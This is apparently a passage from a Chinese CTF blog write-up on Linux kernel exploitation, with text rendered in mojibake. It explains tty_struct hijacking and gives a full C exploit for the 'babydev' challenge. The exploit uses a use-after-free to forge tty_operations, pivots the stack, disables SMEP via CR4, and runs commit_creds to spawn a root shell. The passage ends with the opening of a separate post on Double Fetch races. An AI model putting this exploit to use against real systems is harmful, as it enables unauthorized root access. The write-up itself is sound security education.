<p>ç³»ç»Ÿä¼šæ ¹æ® <code>CR4</code> å¯„å­˜å™¨ä¸­ç¬¬äºŒåä½çš„å€¼æ¥åˆ¤æ–­ <code>SMEP</code> ä¿æŠ¤æ˜¯å¦å¼€å¯ï¼ˆ <code>1</code> ä¸ºå¼€å¯ï¼Œ<code>0</code> ä¸ºå…³é—­ ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304211706032.png" alt="image-20230421170620883"></p>
<p>åœ¨æ‰“å¼€ <code>/dev/ptmx</code> è®¾å¤‡æ—¶ï¼Œä¼šåˆ†é…ä¸€ä¸ª <code>tty_struct</code> ç»“æ„ä½“ï¼Œå®šä¹‰å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> magic;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line">    <span class="comment">/* Protects ldisc changes: Lock tty not pty */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line">    <span class="type">spinlock_t</span> ctrl_lock;</span><br><span class="line">    <span class="type">spinlock_t</span> flow_lock;</span><br><span class="line">    <span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">termiox</span> *<span class="title">termiox</span>;</span>    <span class="comment">/* May be NULL for unsupported */</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">64</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span>       <span class="comment">/* Protected by ctrl lock */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line">    <span class="type">int</span> count;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>     <span class="comment">/* winsize_mutex */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stopped:<span class="number">1</span>,    <span class="comment">/* flow_lock */</span></span><br><span class="line">              flow_stopped:<span class="number">1</span>,</span><br><span class="line">              unused:BITS_PER_LONG - <span class="number">2</span>;</span><br><span class="line">    <span class="type">int</span> hw_stopped;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ctrl_status:<span class="number">8</span>,    <span class="comment">/* ctrl_lock */</span></span><br><span class="line">              packet:<span class="number">1</span>,</span><br><span class="line">              unused_ctrl:BITS_PER_LONG - <span class="number">9</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> receive_room;  <span class="comment">/* Bytes free for queue */</span></span><br><span class="line">    <span class="type">int</span> flow_change;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line">    <span class="type">wait_queue_head_t</span> write_wait;</span><br><span class="line">    <span class="type">wait_queue_head_t</span> read_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line">    <span class="type">void</span> *disc_data;</span><br><span class="line">    <span class="type">void</span> *driver_data;</span><br><span class="line">    <span class="type">spinlock_t</span> files_lock;      <span class="comment">/* protects tty_files list */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line">    <span class="type">int</span> closing;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *write_buf;</span><br><span class="line">    <span class="type">int</span> write_cnt;</span><br><span class="line">    <span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­å…³æ³¨çš„æ˜¯ <code>const struct tty_operations *ops</code> æŒ‡é’ˆï¼Œè¯¥æŒ‡é’ˆæŒ‡å‘äº†ç»“æ„ä½“ <code>tty_operations</code> ï¼ˆå®šä¹‰å¦‚ä¸‹ï¼‰</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">            <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="type">int</span>  (*install)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*remove)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*open)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*close)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*shutdown)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*cleanup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*write)(<span class="keyword">struct</span> tty_struct * tty,</span><br><span class="line">              <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">int</span> count);</span><br><span class="line">    <span class="type">int</span>  (*put_char)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">unsigned</span> <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">void</span> (*flush_chars)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*write_room)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*chars_in_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">long</span> (*compat_ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                 <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">void</span> (*set_termios)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> ktermios * old);</span><br><span class="line">    <span class="type">void</span> (*throttle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*unthrottle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*stop)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*start)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*hangup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*break_ctl)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> state);</span><br><span class="line">    <span class="type">void</span> (*flush_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*set_ldisc)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*wait_until_sent)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> timeout);</span><br><span class="line">    <span class="type">void</span> (*send_xchar)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">int</span> (*tiocmget)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*tiocmset)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">set</span>, <span class="type">unsigned</span> <span class="type">int</span> clear);</span><br><span class="line">    <span class="type">int</span> (*resize)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> winsize *ws);</span><br><span class="line">    <span class="type">int</span> (*set_termiox)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> termiox *tnew);</span><br><span class="line">    <span class="type">int</span> (*get_icount)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                <span class="keyword">struct</span> serial_icounter_struct *icount);</span><br><span class="line">    <span class="type">void</span> (*show_fdinfo)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> seq_file *m);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="type">int</span> (*poll_init)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> *options);</span><br><span class="line">    <span class="type">int</span> (*poll_get_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line);</span><br><span class="line">    <span class="type">void</span> (*poll_put_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">int</span> (*proc_show)(<span class="keyword">struct</span> seq_file *, <span class="type">void</span> *);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœèƒ½åŠ«æŒæ‰ä¸Šé¢çš„æŒ‡é’ˆï¼Œåœ¨å¯¹ <code>/dev/ptmx</code> æ–‡ä»¶è¿›è¡Œ <code>write</code> æˆ–è€… <code>read</code> ç­‰æ“ä½œæ—¶å°±å¯ä»¥è·³è½¬æˆ‘ä»¬æŒ‡å®šçš„å‡½æ•°æŒ‡é’ˆæ‰§è¡Œï¼Œæœ‰ç‚¹ç±»ä¼¼äº <code>FSOP</code> </p>
<h3 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3><p>åœ¨åŠ«æŒçš„ä½ç½®å…ˆè¿›è¡Œç¬¬ä¸€æ¬¡è¿ç§»ï¼Œ<code>rax</code> æ­£å¥½æ˜¯ <code>fake_tty_operation</code> çš„åœ°å€ï¼Œäºæ˜¯ï¼Œæˆ‘ä»¬æŠŠæ ˆè½¬ç§»åˆ° <code>fake_tty_operations</code> é‡Œ,æ­¤å¤„æ˜¯å¯ä»¥æ”¾ä¸€å°‘éƒ¨åˆ† <code>gadget</code> ï¼Œç”¨è¿™éƒ¨åˆ†è¿›è¡Œç¬¬äºŒæ¬¡è¿ç§»ï¼Œè¿ç§»åˆ°å †å—ä¸­çš„ <code>rop</code> é“¾ä¸Šï¼Œç”¨ <code>mov cr4,rdi</code> è¿™ä¸ª <code>gadget</code> æ¥æ”¹å˜ <code>cr4</code> å¯„å­˜å™¨çš„å€¼ä»è€Œç»•è¿‡ <code>SMEP</code> ä¿æŠ¤ï¼Œéšåæ‰“ä¸€ä¸ª <code>ret2user</code> å³å¯å®Œæˆææƒã€‚</p>
<p>æ­¤å¤„çš„ <code>EXP</code> ç”¨çš„æ˜¯ <a target="_blank" rel="noopener" href="https://blog.csdn.net/seaaseesa/article/details/104577501">ha1vk</a>  å¸ˆå‚…çš„ï¼Œå› ä¸ºè¿™é¢˜å·²ç»åšè¿‡äº†ï¼Œå¹¶ä¸” <code>ha1vk</code> å¸ˆå‚…å†™çš„ä¹Ÿå¾ˆè¯¦ç»†ï¼Œå†å†™ä¸€éä¹Ÿæ²¡æœ‰ä»€ä¹ˆå¤§çš„æ”¹å˜</p>
<h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//tty_structç»“æ„ä½“çš„å¤§å°</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_STRUCT_SIZE 0x2E0</span></span><br><span class="line"><span class="comment">//mov cr4, rdi ; pop rbp ; ret</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOV_CR4_RDI 0xffffffff81004d80</span></span><br><span class="line"><span class="comment">//pop rdi ; ret</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI 0xffffffff810d238d</span></span><br><span class="line"><span class="comment">//swapgs ; pop rbp ; ret</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS 0xffffffff81063694</span></span><br><span class="line"><span class="comment">//iretq</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRETQ 0xFFFFFFFF8181A797</span></span><br><span class="line"><span class="comment">//commit_credså‡½æ•°</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff810a1420</span></span><br><span class="line"><span class="comment">// prepare_kernel_cred</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810a1810</span></span><br><span class="line"><span class="comment">//mov rsp, rax;dec ebx;retï¼Œåšæ ˆè¿ç§»ç”¨</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOV_RSP_RAX 0xFFFFFFFF8181BFC5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RAX 0xffffffff8100ce6e</span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">getRoot</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="comment">//å‡½æ•°æŒ‡é’ˆ</span></span><br><span class="line">   <span class="type">void</span> *(*pkc)(<span class="type">int</span>) = (<span class="type">void</span> *(*)(<span class="type">int</span>))PREPARE_KERNEL_CRED;</span><br><span class="line">   <span class="type">void</span> (*cc)(<span class="type">void</span> *) = (<span class="type">void</span> (*)(<span class="type">void</span> *))COMMIT_CREDS;</span><br><span class="line">   <span class="comment">//commit_creds(prepare_kernel_cred(0))</span></span><br><span class="line">   (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="keyword">if</span> (getuid() == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[+]Rooted!!\n&quot;</span>);</span><br><span class="line">      system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[+]Root Fail!!\n&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">size_t</span> user_cs,user_ss,user_flags,user_sp;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*ä¿å­˜ç”¨æˆ·æ€çš„å¯„å­˜å™¨åˆ°å˜é‡é‡Œ*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveUserState</span><span class="params">()</span> &#123;</span><br><span class="line">   __asm__(<span class="string">&quot;mov %cs,user_cs;&quot;</span></span><br><span class="line">           <span class="string">&quot;mov %ss,user_ss;&quot;</span></span><br><span class="line">           <span class="string">&quot;mov %rsp,user_sp;&quot;</span></span><br><span class="line">           <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">           <span class="string">&quot;pop user_flags;&quot;</span></span><br><span class="line">           );</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;user states have been saved!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="comment">//ä¿å­˜ç”¨æˆ·æ€å¯„å­˜å™¨</span></span><br><span class="line">   saveUserState();</span><br><span class="line">   <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>,O_RDWR);</span><br><span class="line">   <span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>,O_RDWR);</span><br><span class="line">   <span class="keyword">if</span> (fd1 &lt; <span class="number">0</span> || fd2 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;open file error!!\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//ç”³è¯·ä¸€ä¸ªtty_structå¤§å°çš„å †</span></span><br><span class="line">   ioctl(fd1,<span class="number">0x10001</span>,TTY_STRUCT_SIZE);</span><br><span class="line">   <span class="comment">//é‡Šæ”¾è¿™ä¸ªå †</span></span><br><span class="line">   close(fd1);</span><br><span class="line">   <span class="type">size_t</span> rop[<span class="number">0x100</span>];</span><br><span class="line">   <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">   rop[i++] = POP_RDI;</span><br><span class="line">   rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">   rop[i++] = MOV_CR4_RDI;</span><br><span class="line">   rop[i++] = <span class="number">0</span>;</span><br><span class="line">   rop[i++] = (<span class="type">size_t</span>)getRoot;</span><br><span class="line">   rop[i++] = SWAPGS;</span><br><span class="line">   rop[i++] = <span class="number">0</span>;</span><br><span class="line">   rop[i++] = IRETQ;</span><br><span class="line">   rop[i++] = (<span class="type">size_t</span>)getShell;</span><br><span class="line">   rop[i++] = user_cs;</span><br><span class="line">   rop[i++] = user_flags;</span><br><span class="line">   rop[i++] = user_sp;</span><br><span class="line">   rop[i++] = user_ss;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">   <span class="type">size_t</span> fake_tty_operations[<span class="number">35</span>];</span><br><span class="line">   <span class="comment">/*for (int i=0;i&lt;35;i++) &#123;</span></span><br><span class="line"><span class="comment">      fake_tty_operations[i] = 0xffffffffc0000000 + i;</span></span><br><span class="line"><span class="comment">   &#125;*/</span></span><br><span class="line">   <span class="comment">//è¿™ä¸ªä½ç½®æ˜¯writeå‡½æ•°çš„æŒ‡é’ˆï¼Œç»è¿‡è°ƒè¯•ï¼Œæˆ‘ä»¬å‘ç°å½“è°ƒç”¨è¿™ä¸ªå‡½æ•°æ—¶ï¼Œraxæ­£å¥½æ˜¯fake_tty_operationçš„åœ°å€ï¼Œäºæ˜¯ï¼Œæˆ‘ä»¬æŠŠæ ˆè½¬ç§»åˆ°</span></span><br><span class="line">   <span class="comment">//fake_tty_operationsé‡Œ</span></span><br><span class="line">   fake_tty_operations[<span class="number">7</span>] = MOV_RSP_RAX;</span><br><span class="line">   <span class="comment">//æ ˆè½¬ç§»åˆ°fake_tty_operationsé‡Œåï¼Œæˆ‘ä»¬ç»§ç»­åšä¸€æ¬¡è½¬ç§»ï¼ŒæŠŠè½¬è½¬ç§»åˆ°æˆ‘ä»¬çš„ropæ•°ç»„é‡Œï¼Œæ‰§è¡ŒROP</span></span><br><span class="line">   fake_tty_operations[<span class="number">0</span>] = POP_RAX;</span><br><span class="line">   fake_tty_operations[<span class="number">1</span>] = (<span class="type">size_t</span>)rop;</span><br><span class="line">   fake_tty_operations[<span class="number">2</span>] = MOV_RSP_RAX;</span><br><span class="line"> </span><br><span class="line">   <span class="type">size_t</span> fake_tty_struct[<span class="number">4</span>];</span><br><span class="line">   <span class="comment">//è¿™ä¸ªæ“ä½œä¼šç”³è¯·tty_structçš„ç©ºé—´ï¼Œä¹Ÿå°±æ˜¯ä¼šç”³è¯·åˆ°æˆ‘ä»¬ä¹‹å‰é‡Šæ”¾çš„é‚£ä¸ªå †é‡Œï¼Œæˆ‘ä»¬å¯ä»¥ç”¨fd2æ¥å¯¹å®ƒæ“ä½œ</span></span><br><span class="line">   <span class="type">int</span> fd_tty = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR);</span><br><span class="line">   <span class="comment">//æˆ‘ä»¬å…ˆæŠŠåŸå§‹çš„tty_structå‰é¢çš„æ•°æ®è¯»å‡ºæ¥ï¼Œå­˜å‚¨</span></span><br><span class="line">   read(fd2,fake_tty_struct,<span class="number">4</span>*<span class="number">8</span>);</span><br><span class="line">   <span class="comment">//ä¿®æ”¹const struct tty_operations *ops;æŒ‡é’ˆï¼ŒæŒ‡å‘æˆ‘ä»¬ä¼ªé€ çš„tty_operations</span></span><br><span class="line">   fake_tty_struct[<span class="number">3</span>] = (<span class="type">size_t</span>)fake_tty_operations;</span><br><span class="line">   <span class="comment">//æŠŠç¯¡æ”¹è¿‡çš„tty_structå†™å›å»</span></span><br><span class="line">   write(fd2,fake_tty_struct,<span class="number">4</span>*<span class="number">8</span>);</span><br><span class="line">   <span class="type">char</span> buf[<span class="number">0x10</span>];</span><br><span class="line">   write(fd_tty,buf,<span class="number">0x10</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h3><p><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/175110.html">Kernel pwn åŸºç¡€æ•™ç¨‹ä¹‹ ret2usr ä¸ bypass_smep - SecPulse.COM | å®‰å…¨è„‰æ</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40827990/article/details/98937960">(47æ¡æ¶ˆæ¯) Linux Kernel Exploit å†…æ ¸æ¼æ´å­¦ä¹ (3)-Bypass-Smep_é’sirçš„åšå®¢-CSDNåšå®¢</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/seaaseesa/article/details/104577501">(47æ¡æ¶ˆæ¯) linux kernel pwnå­¦ä¹ ä¹‹ä¼ªé€ tty_structæ‰§è¡Œä»»æ„å‡½æ•°_ha1vkçš„åšå®¢-CSDNåšå®¢</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40827990/article/details/98520140?spm=1001.2014.3001.5502">(47æ¡æ¶ˆæ¯) Linux Kernel Exploit å†…æ ¸æ¼æ´å­¦ä¹ (2)-ROP_é’sirçš„åšå®¢-CSDNåšå®¢</a></p>
<p><a target="_blank" rel="noopener" href="https://ama2in9.top/2020/09/03/kernel/">Kernel Pwnä»å…¥é—¨åˆ°æ”¾å¼ƒ | Ama2in9</a></p>
<p><a target="_blank" rel="noopener" href="https://x3h1n.github.io/2019/07/04/2018%E5%BC%BA%E7%BD%91%E6%9D%AF-core/">2018å¼ºç½‘æ¯ core | X3h1n</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/6176bce9.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="ä¸‡å¤å‡¡é—´ä¸€è¿‡å®¢ï¼Œä¹å¤©ä¹‹ä¸Šç¬¬ä¸€ä»™">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/6176bce9.html" class="post-title-link" itemprop="url">å…³äº kernel-Double Fetch çš„å­¦ä¹ æ€»ç»“</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">å‘è¡¨äº</span>
      

      <time title="åˆ›å»ºæ—¶é—´ï¼š2023-05-15 07:36:47 / ä¿®æ”¹æ—¶é—´ï¼š08:59:24" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">åˆ†ç±»äº</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">å­¦ä¹ æ€»ç»“</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><blockquote>
<p><code>Double Fetch</code> ä»æ¼æ´åŸç†ä¸Šå±äºæ¡ä»¶ç«äº‰æ¼æ´ï¼Œæ˜¯ä¸€ç§å†…æ ¸æ€ä¸ç”¨æˆ·æ€ä¹‹é—´çš„æ•°æ®è®¿é—®ç«äº‰ã€‚</p>
<p>åœ¨ Linux ç­‰ç°ä»£æ“ä½œç³»ç»Ÿä¸­ï¼Œè™šæ‹Ÿå†…å­˜åœ°å€é€šå¸¸è¢«åˆ’åˆ†ä¸ºå†…æ ¸ç©ºé—´å’Œç”¨æˆ·ç©ºé—´ã€‚å†…æ ¸ç©ºé—´è´Ÿè´£è¿è¡Œå†…æ ¸ä»£ç ã€é©±åŠ¨æ¨¡å—ä»£ç ç­‰ï¼Œæƒé™è¾ƒé«˜ã€‚è€Œç”¨æˆ·ç©ºé—´è¿è¡Œç”¨æˆ·ä»£ç ï¼Œå¹¶é€šè¿‡ç³»ç»Ÿè°ƒç”¨è¿›å…¥å†…æ ¸å®Œæˆç›¸å…³åŠŸèƒ½ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œç”¨æˆ·ç©ºé—´å‘å†…æ ¸ä¼ é€’æ•°æ®æ—¶ï¼Œå†…æ ¸å…ˆé€šè¿‡é€šè¿‡ <code>copy_from_user</code> ç­‰æ‹·è´å‡½æ•°å°†ç”¨æˆ·æ•°æ®æ‹·è´è‡³å†…æ ¸ç©ºé—´è¿›è¡Œæ ¡éªŒåŠç›¸å…³å¤„ç†ï¼Œä½†<strong>åœ¨è¾“å…¥æ•°æ®è¾ƒä¸ºå¤æ‚æ—¶ï¼Œå†…æ ¸å¯èƒ½åªå¼•ç”¨å…¶æŒ‡é’ˆï¼Œè€Œå°†æ•°æ®æš‚æ—¶ä¿å­˜åœ¨ç”¨æˆ·ç©ºé—´è¿›è¡Œåç»­å¤„ç†ã€‚æ­¤æ—¶ï¼Œè¯¥æ•°æ®å­˜åœ¨è¢«å…¶ä»–æ¶æ„çº¿ç¨‹ç¯¡æ”¹é£é™©ï¼Œé€ æˆå†…æ ¸éªŒè¯é€šè¿‡æ•°æ®ä¸å®é™…ä½¿ç”¨æ•°æ®ä¸ä¸€è‡´ï¼Œå¯¼è‡´å†…æ ¸ä»£ç æ‰§è¡Œå¼‚å¸¸</strong>ã€‚</p>
